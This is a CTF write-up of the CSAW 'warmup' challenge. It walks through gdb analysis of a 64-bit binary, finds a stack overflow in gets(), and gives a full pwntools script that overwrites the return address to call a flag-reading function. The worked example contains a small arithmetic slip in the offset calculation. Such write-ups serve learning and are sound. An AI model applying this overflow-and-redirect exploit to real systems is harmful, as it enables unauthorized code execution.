```
So you want to be a pwn-er huh? Well let's throw you an easy one ;)

nc pwn.chal.csaw.io 8000
```

Let's take a look at the file they gave us.

```
guyinatuxedo@tux:/Hackery/ctf/csaw/warmup$ file warmup 
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab
209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
```

So this is a 64 bit linux executable, so the registers will be named different from traditional 32 bit registers, and the addresses
will be longer. Let's see what this elf does.

```
guyinatuxedo@tux:/Hackery/ctf/csaw/warmup$ ./warmup 
-Warm Up-
WOW:0x40060d
>gimme the flag
guyinatuxedo@tux:/Hackery/ctf/csaw/warmup$ ./warmup 
-Warm Up-
WOW:0x40060d
>please
```

From the looks of it, it just prints out an address, takes input, then exits. Let's take a look at the assembly of the main function using gdb.

```
guyinatuxedo@tux:/Hackery/ctf/csaw/warmup$ gdb ./warmup 
gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000040061d <+0>:	push   rbp
   0x000000000040061e <+1>:	mov    rbp,rsp
   0x0000000000400621 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:	mov    edx,0xa
   0x000000000040062a <+13>:	mov    esi,0x400741
   0x000000000040062f <+18>:	mov    edi,0x1
   0x0000000000400634 <+23>:	call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:	mov    edx,0x4
   0x000000000040063e <+33>:	mov    esi,0x40074c
   0x0000000000400643 <+38>:	mov    edi,0x1
   0x0000000000400648 <+43>:	call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:	lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:	mov    edx,0x40060d
   0x0000000000400656 <+57>:	mov    esi,0x400751
   0x000000000040065b <+62>:	mov    rdi,rax
   0x000000000040065e <+65>:	mov    eax,0x0
   0x0000000000400663 <+70>:	call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:	lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:	mov    edx,0x9
   0x0000000000400671 <+84>:	mov    rsi,rax
   0x0000000000400674 <+87>:	mov    edi,0x1
   0x0000000000400679 <+92>:	call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:	mov    edx,0x1
   0x0000000000400683 <+102>:	mov    esi,0x400755
   0x0000000000400688 <+107>:	mov    edi,0x1
   0x000000000040068d <+112>:	call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:	lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:	mov    rdi,rax
   0x0000000000400699 <+124>:	mov    eax,0x0
   0x000000000040069e <+129>:	call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:	leave  
   0x00000000004006a4 <+135>:	ret    
End of assembler dump.
```

Looking at this, we can see that it calls a function write(), which probably does what it sounds like and is what is responsible for printing the text at the beginning.
However, right before the program leaves we see that it calls the vulnerable function gets(). This function is vulnerable because it will just accept input untill it crashes, which will leas to buffer overflows.
With this we can overflow the return address stored in the rip register, however we need to calculate the difference between where we can start writing to the stack, and the rip register location.

```
gdb-peda$ b *main+134
Breakpoint 1 at 0x4006a3
gdb-peda$ run
Starting program: /Hackery/ctf/csaw/warmup/warmup 
-Warm Up-
WOW:0x40060d
>0000000000
```

and after a bunch of output

```
Breakpoint 1, 0x000000000040069e in main ()
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde70:
 rip = 0x40069e in main; saved rip = 0x7ffff7a2e830
 called by frame at 0x7fffffffdf30
 Arglist at 0x7fffffffde60, args: 
 Locals at 0x7fffffffde60, Previous frame's sp is 0x7fffffffde70
 Saved registers:
  rbp at 0x7fffffffde60, rip at 0x7fffffffde68
gdb-peda$ x $rbp-0x40
0x7fffffffde20:	0x3030303030303030 
```

From there we can see that the rip register is stored at the address 0x7fffffffde68, and that the address that our input is first stored at is 0x7fffffffde20. I knew to look at rbp-0x40, because it was the location pushed onto the stack before gets() was called, so it had to be an argument for gets().
In addition to that, the value that is currently stored there 0x30 repeating is hex for 0, which is what should be there.

```
0x7fffffffde70 - 0x7fffffffde20 = 72
```

So we now know that we have to write 72 characters before we hit the rip register, and we can change code execution flow. However what do we change it to? Let's see if that address the program gives us acutally leads anywhere using objdump.

```
guyinatuxedo@tux:/Hackery/ctf/csaw/warmup$ objdump -t warmup | grep 40060d
000000000040060d g     F .text	0000000000000010              easy
```

So it leads to a function named easy. It is worth a shot to see what happens if we changed the code flow execution to run this function (when you look at the function, you see that it opens a file named flag.txt). Here is the exploit to do so.

```
#First import pwntools
from pwn import *

#Setup remote connection to the server. The commented line below this is to setup an interface to a local elf stored in the same directory as the exploit in stead of the one on the server
conn = remote('pwn.chal.csaw.io', 8000)
#conn = process('warmup')

#This constructs the payload, and since this is 64 bit, the address has to be 8 bytes instead of 4
payload = "0"*72 + "\x0d\x06\x40\x00\x00\x00\x00\x00"

#This prints out the text in the beginning
print conn.recvline()
print conn.recvline()

#This sends the payload
print "Sending payload"
conn.sendline(payload)

#This drops us to an interactive prompt, so we can read the flag 
conn.interactive()
```

And the exploit works, and we have the flag. Now if this challenge has been taken down, you can just exploit the elf. Except it won't give you the flag, it will give you an error like this.

```
>cat: flag.txt: No such file or directory
```



